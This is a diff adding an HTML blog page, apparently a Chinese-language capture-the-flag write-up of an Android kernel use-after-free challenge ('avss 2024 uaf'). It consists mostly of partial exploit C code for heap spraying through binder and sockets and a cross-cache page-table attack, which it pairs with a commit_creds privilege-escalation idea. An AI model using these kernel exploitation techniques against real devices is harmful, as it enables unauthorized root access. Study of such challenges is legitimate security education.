@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;">
+    <title>avss 2024 uaf</title>
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header>
+        <nav class="site-nav">
+            <a href="./index.html" class="nav-link">/home</a>
+            <span class="nav-separator">|</span>
+            <a href="./about.html" class="nav-link">/about</a>
+        </nav>
+        <div class="terminal-prompt">
+            <span style="color:#666">[</span><span style="color:#fabd2f">ayoung</span><span style="color:#666">@</span><span style="color:#59adeb">lab</span> <span style="color:#83a598"><a href="./index.html" class="path-link">posts</a></span><span style="color:#666">]$</span> 
+            <span class="cmd">cat ./avss 2024 uaf.md</span><span class="cursor">█</span>
+        </div>
+        <h1 class="post-title">avss 2024 uaf</h1><div style="color: #666; font-size: 0.8rem; margin-bottom: 20px;">[Last modified: 2026-02-09]</div>
+    </header>
+    <div class="layout-grid">
+                <main><p>最终执行<code>commit_creds</code>和<code>prepare_kernel_creds</code>组成的提权代码，注意安卓内核中<code>prepare_kernel_creds()</code>变成了无参数，从当前cred复制一份，需要手动添加修改uid的代码；同时<code>BL</code>跳转指令跟偏移有关，直接在ida中patch代码，然后将字节码复制出来</p>
+<h2 id="android12">android12</h2><p>略</p>
+<h2 id="android13">android13</h2><h3 id="exp">exp</h3><p>利用<code>binder_thread</code>堆喷 cross-cache打页表，patch sys_uaf的代码</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#65737e;">#define _GNU_SOURCE
+</span><span style="color:#65737e;">#include &lt;errno.h&gt;
+</span><span style="color:#65737e;">#include &lt;fcntl.h&gt;
+</span><span style="color:#65737e;">#include &lt;sched.h&gt;
+</span><span style="color:#65737e;">#include &lt;stdio.h&gt;
+</span><span style="color:#65737e;">#include &lt;stdlib.h&gt;
+</span><span style="color:#65737e;">#include &lt;sys/epoll.h&gt;
+</span><span style="color:#65737e;">#include &lt;sys/ioctl.h&gt;
+</span><span style="color:#65737e;">#include &lt;sys/mman.h&gt;
+</span><span style="color:#65737e;">#include &lt;sys/prctl.h&gt;
+</span><span style="color:#65737e;">#include &lt;sys/socket.h&gt;
+</span><span style="color:#65737e;">#include &lt;sys/uio.h&gt;
+</span><span style="color:#65737e;">#include &lt;sys/user.h&gt;
+</span><span style="color:#65737e;">#include &lt;sys/wait.h&gt;
+</span><span style="color:#65737e;">#include &lt;unistd.h&gt;
+</span><span style="color:#65737e;">#include &lt;string.h&gt;
+</span><span style="color:#65737e;">#include &lt;stddef.h&gt;
+</span><span style="color:#65737e;">#include &lt;sys/syscall.h&gt;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#65737e;">#define COLOR_RED &quot;\033[1;31m&quot;
+</span><span style="color:#65737e;">#define COLOR_GREEN &quot;\033[1;32m&quot;
+</span><span style="color:#65737e;">#define COLOR_RESET &quot;\033[0m&quot;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#65737e;">#define INFO(format, ...) do { \
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#d08770;">%s</span><span style="color:#a3be8c;">[</span><span style="color:#d08770;">%s</span><span style="color:#a3be8c;">]: </span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#bf616a;">COLOR_GREEN</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#a3be8c;">log</span><span style="color:#c0c5ce;">&quot;); \
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">printf</span><span style="color:#c0c5ce;">(</span><span style="color:#96b5b4;">format</span><span style="color:#c0c5ce;">, </span><span style="color:#65737e;">##__VA_ARGS__); \
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#d08770;">%s</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#bf616a;">COLOR_RESET</span><span style="color:#c0c5ce;">); \
+</span><span style="background-color:#bf616a;color:#2b303b;">}</span><span style="color:#c0c5ce;"> </span><span style="background-color:#bf616a;color:#2b303b;">while</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">void </span><span style="color:#8fa1b3;">err_exit</span><span style="color:#c0c5ce;">(char *buf){
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">fprintf</span><span style="color:#c0c5ce;">(stderr, &quot;</span><span style="color:#d08770;">%s</span><span style="color:#a3be8c;">[error]</span><span style="color:#d08770;">%s</span><span style="color:#a3be8c;"> : </span><span style="color:#d08770;">%s%s</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#bf616a;">COLOR_RED</span><span style="color:#c0c5ce;">, buf, </span><span style="color:#8fa1b3;">strerror</span><span style="color:#c0c5ce;">(errno), </span><span style="color:#bf616a;">COLOR_RESET</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">exit</span><span style="color:#c0c5ce;">(-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">static inline void </span><span style="color:#8fa1b3;">check_ret</span><span style="color:#c0c5ce;">(int ret,char *msg) {
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(ret) {
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">err_exit</span><span style="color:#c0c5ce;">(msg);
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#65737e;">#define PAGE_SIZE 0X1000
+</span><span style="color:#65737e;">#define __NR_uaf 602
+</span><span style="color:#65737e;">#define BUFSZ 256
+</span><span style="color:#65737e;">#define NEW 0
+</span><span style="color:#65737e;">#define DEL 1
+</span><span style="color:#65737e;">#define SHOW 2
+</span><span style="color:#65737e;">#define EDIT 3
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">struct st1{
+</span><span style="color:#c0c5ce;">    char name[</span><span style="color:#bf616a;">BUFSZ</span><span style="color:#c0c5ce;">];
+</span><span style="color:#c0c5ce;">    char str[</span><span style="color:#d08770;">128</span><span style="color:#c0c5ce;">];
+</span><span style="color:#c0c5ce;">};
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">void </span><span style="color:#8fa1b3;">New</span><span style="color:#c0c5ce;">(size_t idx){
+</span><span style="color:#c0c5ce;">    size_t option = (((idx&lt;&lt;</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">) &amp; </span><span style="color:#d08770;">0xff00</span><span style="color:#c0c5ce;">) | </span><span style="color:#bf616a;">NEW </span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    int fnc_ret = </span><span style="color:#8fa1b3;">syscall</span><span style="color:#c0c5ce;">(__NR_uaf,</span><span style="color:#bf616a;">NULL</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,option);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">check_ret</span><span style="color:#c0c5ce;">(fnc_ret&lt;</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,&quot;</span><span style="color:#a3be8c;">syscall new fail</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">void </span><span style="color:#8fa1b3;">Del</span><span style="color:#c0c5ce;">(size_t idx){
+</span><span style="color:#c0c5ce;">    size_t option = (((idx&lt;&lt;</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">) &amp; </span><span style="color:#d08770;">0xff00</span><span style="color:#c0c5ce;">) | </span><span style="color:#bf616a;">DEL </span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    int fnc_ret = </span><span style="color:#8fa1b3;">syscall</span><span style="color:#c0c5ce;">(__NR_uaf,</span><span style="color:#bf616a;">NULL</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,option);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">check_ret</span><span style="color:#c0c5ce;">(fnc_ret&lt;</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,&quot;</span><span style="color:#a3be8c;">syscall del fail</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">void </span><span style="color:#8fa1b3;">Show</span><span style="color:#c0c5ce;">(size_t idx, char *buffer, size_t length){
+</span><span style="color:#c0c5ce;">    size_t option = (((idx&lt;&lt;</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">) &amp; </span><span style="color:#d08770;">0xff00</span><span style="color:#c0c5ce;">) | </span><span style="color:#bf616a;">SHOW </span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    int fnc_ret = </span><span style="color:#8fa1b3;">syscall</span><span style="color:#c0c5ce;">(__NR_uaf,buffer,length,option);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">check_ret</span><span style="color:#c0c5ce;">(fnc_ret&lt;</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,&quot;</span><span style="color:#a3be8c;">syscall show fail</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">void </span><span style="color:#8fa1b3;">Edit</span><span style="color:#c0c5ce;">(size_t idx,char *buffer,size_t length){
+</span><span style="color:#c0c5ce;">    size_t option = (((idx&lt;&lt;</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">) &amp; </span><span style="color:#d08770;">0xff00</span><span style="color:#c0c5ce;">) | </span><span style="color:#bf616a;">EDIT </span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    int fnc_ret = </span><span style="color:#8fa1b3;">syscall</span><span style="color:#c0c5ce;">(__NR_uaf,buffer,length,option);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">check_ret</span><span style="color:#c0c5ce;">(fnc_ret&lt;</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,&quot;</span><span style="color:#a3be8c;">syscall edit fail</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#65737e;">#define BINDER_THREAD_DRAIN_NUM 200
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">void </span><span style="color:#8fa1b3;">BindCpu</span><span style="color:#c0c5ce;">(int core){
+</span><span style="color:#c0c5ce;">    cpu_set_t set;
+</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">CPU_ZERO</span><span style="color:#c0c5ce;">(&amp;set);
+</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">CPU_SET</span><span style="color:#c0c5ce;">(core, &amp;set);
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">sched_setaffinity</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">sizeof</span><span style="color:#c0c5ce;">(set), &amp;set) &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
+</span><span style="color:#c0c5ce;">		</span><span style="color:#8fa1b3;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">sched_setaffinity</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">		</span><span style="color:#8fa1b3;">exit</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">EXIT_FAILURE</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">	}
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">int </span><span style="color:#8fa1b3;">GetMemFileFd</span><span style="color:#c0c5ce;">(char * mem_file_name,size_t page_nr){
+</span><span style="color:#c0c5ce;">    int memfd=</span><span style="color:#8fa1b3;">memfd_create</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">io_register_buf</span><span style="color:#c0c5ce;">&quot;,</span><span style="color:#bf616a;">MFD_CLOEXEC</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">check_ret</span><span style="color:#c0c5ce;">(memfd&lt;</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,&quot;</span><span style="color:#a3be8c;">memfd_create fail</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">check_ret</span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">fallocate</span><span style="color:#c0c5ce;">(memfd, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, page_nr * </span><span style="color:#bf616a;">PAGE_SIZE</span><span style="color:#c0c5ce;">),&quot;</span><span style="color:#a3be8c;">fallocate fail</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    </span><span style="background-color:#bf616a;color:#2b303b;">return</span><span style="color:#c0c5ce;"> memfd;
+</span><span style="background-color:#bf616a;color:#2b303b;">}</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">void </span><span style="color:#8fa1b3;">SysToString</span><span style="color:#c0c5ce;">(int idx_max){
+</span><span style="color:#c0c5ce;">    char buf[</span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">];
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">memset</span><span style="color:#c0c5ce;">(buf,</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for</span><span style="color:#c0c5ce;">(int i=0;i&lt;=idx_max;i++){
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">Show</span><span style="color:#c0c5ce;">(i,buf,</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">INFO</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">syscal </span><span style="color:#d08770;">%d</span><span style="color:#a3be8c;">-heap content:0x%llx</span><span style="color:#c0c5ce;">&quot;, i, (long long)*(size_t *)buf);
+</span><span style="color:#c0c5ce;">    }
+</span><span style="background-color:#bf616a;color:#2b303b;">}</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">int </span><span style="color:#8fa1b3;">OpenBinder</span><span style="color:#c0c5ce;">(){  
+</span><span style="color:#c0c5ce;">    int fd=</span><span style="color:#96b5b4;">open</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/dev/binder</span><span style="color:#c0c5ce;">&quot;, O_RDONLY);  
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">check_ret</span><span style="color:#c0c5ce;">(fd&lt;</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,&quot;</span><span style="color:#a3be8c;">open binder fail</span><span style="color:#c0c5ce;">&quot;);  
+</span><span style="color:#c0c5ce;">    </span><span style="background-color:#bf616a;color:#2b303b;">return</span><span style="color:#c0c5ce;"> fd;  
+</span><span style="background-color:#bf616a;color:#2b303b;">}</span><span style="color:#c0c5ce;">  
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">int </span><span style="color:#8fa1b3;">OpenEpoll</span><span style="color:#c0c5ce;">(){  
+</span><span style="color:#c0c5ce;">    int epfd= </span><span style="color:#8fa1b3;">epoll_create</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);  
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">check_ret</span><span style="color:#c0c5ce;">(epfd&lt;</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,&quot;</span><span style="color:#a3be8c;">epoll_create fail</span><span style="color:#c0c5ce;">&quot;);  
+</span><span style="color:#c0c5ce;">    </span><span style="background-color:#bf616a;color:#2b303b;">return</span><span style="color:#c0c5ce;"> epfd;  
+</span><span style="background-color:#bf616a;color:#2b303b;">}</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">void </span><span style="color:#8fa1b3;">EpollCtl</span><span style="color:#c0c5ce;">(int epfd,int io_fd,uint32_t cmd,uint32_t io_type){  
+</span><span style="color:#c0c5ce;">    struct epoll_event epe={  
+</span><span style="color:#c0c5ce;">        .events=io_type  
+</span><span style="color:#c0c5ce;">    };  
+</span><span style="color:#c0c5ce;">    int ret=</span><span style="color:#8fa1b3;">epoll_ctl</span><span style="color:#c0c5ce;">(epfd,cmd,io_fd,&amp;epe);  
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">check_ret</span><span style="color:#c0c5ce;">(ret&lt;</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,&quot;</span><span style="color:#a3be8c;">epoll_ctl</span><span style="color:#c0c5ce;">&quot;);  
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#65737e;">#define PIPE_NUM 8
+</span><span style="color:#65737e;">#define BUFF_NUM 100
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">int </span><span style="color:#8fa1b3;">initSocketArray</span><span style="color:#c0c5ce;">(int sk_socket[][</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">],int socker_nr)
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">    /* socket pairs to spray sk_buff */
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for</span><span style="color:#c0c5ce;"> (int i = 0; i &lt; socker_nr; i++) {
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">socketpair</span><span style="color:#c0c5ce;">(AF_UNIX, </span><span style="color:#bf616a;">SOCK_STREAM</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, sk_socket[i]) &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
+</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[x] failed to create no socket pair!</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">err_exit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[x] failed to create no. socket pair!</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">            </span><span style="background-color:#bf616a;color:#2b303b;">return</span><span style="color:#c0c5ce;"> -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">        }
+</span><span style="color:#c0c5ce;">    </span><span style="background-color:#bf616a;color:#2b303b;">}</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="background-color:#bf616a;color:#2b303b;">return</span><span style="color:#c0c5ce;"> 0;
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#8fa1b3;">void OneObjToString</span><span style="color:#c0c5ce;">(int idx){
+</span><span style="color:#c0c5ce;">    char buf[</span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">];
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">memset</span><span style="color:#c0c5ce;">(buf,</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">Show</span><span style="color:#c0c5ce;">(idx,buf,</span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for</span><span style="color:#c0c5ce;">(int i=0;i&lt;0x100/8;i++){
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">INFO</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">idx: </span><span style="color:#d08770;">%d</span><span style="color:#a3be8c;">  content:0x%llx</span><span style="color:#c0c5ce;">&quot;, idx, (long long )*(size_t *)(buf+i*</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">));
+</span><span style="color:#c0c5ce;">    }
+</span><span style="background-color:#bf616a;color:#2b303b;">}</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">int </span><span style="color:#8fa1b3;">JudgeIsPageTable</span><span style="color:#c0c5ce;">(int idx_max){
+</span><span style="color:#c0c5ce;">    char buf[</span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">];
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">memset</span><span style="color:#c0c5ce;">(buf,</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for</span><span style="color:#c0c5ce;">(int i=0;i&lt;=idx_max;i++){
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">Show</span><span style="color:#c0c5ce;">(i,buf,</span><span style="color:#d08770;">0x20</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">for</span><span style="color:#c0c5ce;">(int j=0;j&lt;0x20/8;j++){
+</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">INFO</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">idx: </span><span style="color:#d08770;">%d</span><span style="color:#a3be8c;">  content:0x%llx</span><span style="color:#c0c5ce;">&quot;,i,(long long)*(size_t *)(buf+j*</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">));
+</span><span style="color:#c0c5ce;">            size_t value=(*(size_t *)(buf+j*</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">))&amp;</span><span style="color:#d08770;">0xfff</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">(value==</span><span style="color:#d08770;">0xf43</span><span style="color:#c0c5ce;">){
+</span><span style="color:#c0c5ce;">                </span><span style="color:#8fa1b3;">INFO</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">find page table entry</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">                </span><span style="background-color:#bf616a;color:#2b303b;">return</span><span style="color:#c0c5ce;"> i;
+</span><span style="color:#c0c5ce;">            }
+</span><span style="color:#c0c5ce;">        </span><span style="background-color:#bf616a;color:#2b303b;">}</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="background-color:#bf616a;color:#2b303b;">}</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
+</span><span style="background-color:#bf616a;color:#2b303b;">}</span><span style="color:#c0c5ce;">
+</span><span style="color:#65737e;">#define N_PAGESPRAY 300
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">int </span><span style="color:#8fa1b3;">MemfdCreate</span><span style="color:#c0c5ce;">(char *file_name,size_t size){
+</span><span style="color:#c0c5ce;">    int memfd=</span><span style="color:#8fa1b3;">memfd_create</span><span style="color:#c0c5ce;">(file_name,</span><span style="color:#bf616a;">MFD_CLOEXEC</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">check_ret</span><span style="color:#c0c5ce;">(memfd&lt;</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,&quot;</span><span style="color:#a3be8c;">memfd_create fail</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">check_ret</span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">fallocate</span><span style="color:#c0c5ce;">(memfd, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, size),&quot;</span><span style="color:#a3be8c;">fallocate fail</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    </span><span style="background-color:#bf616a;color:#2b303b;">return</span><span style="color:#c0c5ce;"> memfd;
+</span><span style="background-color:#bf616a;color:#2b303b;">}</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">size_t addr = </span><span style="color:#d08770;">0xf000000</span><span style="color:#c0c5ce;">UL;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">void </span><span style="color:#8fa1b3;">SprayPageTableByMemfd</span><span style="color:#c0c5ce;">(void *page_spray[N_PAGESPRAY][</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">],int fd){
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for</span><span style="color:#c0c5ce;">(int i=0;i&lt;N_PAGESPRAY;i++){
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">for</span><span style="color:#c0c5ce;"> (int j = 0; j &lt; 8; j++){
+</span><span style="color:#c0c5ce;">            page_spray[i][j] = </span><span style="color:#8fa1b3;">mmap</span><span style="color:#c0c5ce;">((void*)(addr +i*</span><span style="color:#d08770;">0x200000</span><span style="color:#c0c5ce;">UL +j*</span><span style="color:#d08770;">64</span><span style="color:#c0c5ce;">*</span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">UL),
+</span><span style="color:#c0c5ce;">                </span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">PROT_READ</span><span style="color:#c0c5ce;">|</span><span style="color:#bf616a;">PROT_WRITE</span><span style="color:#c0c5ce;">,
+</span><span style="color:#c0c5ce;">                </span><span style="color:#bf616a;">MAP_FIXED</span><span style="color:#c0c5ce;">|</span><span style="color:#bf616a;">MAP_SHARED</span><span style="color:#c0c5ce;">, fd, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">check_ret</span><span style="color:#c0c5ce;">(page_spray[i][j]  == </span><span style="color:#bf616a;">MAP_FAILED</span><span style="color:#c0c5ce;">,&quot;</span><span style="color:#a3be8c;">mmap fail</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">            *(char *)(page_spray[i][j] )=&#39;</span><span style="color:#a3be8c;">a</span><span style="color:#c0c5ce;">&#39;;
+</span><span style="color:#c0c5ce;">        }
+</span><span style="color:#c0c5ce;">    </span><span style="background-color:#bf616a;color:#2b303b;">}</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    // addr=(size_t)page_spray[N_PAGESPRAY-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">][</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">]+</span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">
+</span><span style="background-color:#bf616a;color:#2b303b;">}</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">void </span><span style="color:#8fa1b3;">MemmuPageTable</span><span style="color:#c0c5ce;">(void *page_spray[N_PAGESPRAY][</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">]){
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for</span><span style="color:#c0c5ce;">(int i=0;i&lt;N_PAGESPRAY;i++){
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">for</span><span style="color:#c0c5ce;">(int j=0;j&lt;8;j++){
+</span><span style="color:#c0c5ce;">            int ret=</span><span style="color:#8fa1b3;">munmap</span><span style="color:#c0c5ce;">(page_spray[i][j],</span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">check_ret</span><span style="color:#c0c5ce;">(ret&lt;</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,&quot;</span><span style="color:#a3be8c;">munmap fail</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">            page_spray[i][j]=</span><span style="color:#bf616a;">NULL</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">        }
+</span><span style="color:#c0c5ce;">    </span><span style="background-color:#bf616a;color:#2b303b;">}</span><span style="color:#c0c5ce;">
+</span><span style="background-color:#bf616a;color:#2b303b;">}</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
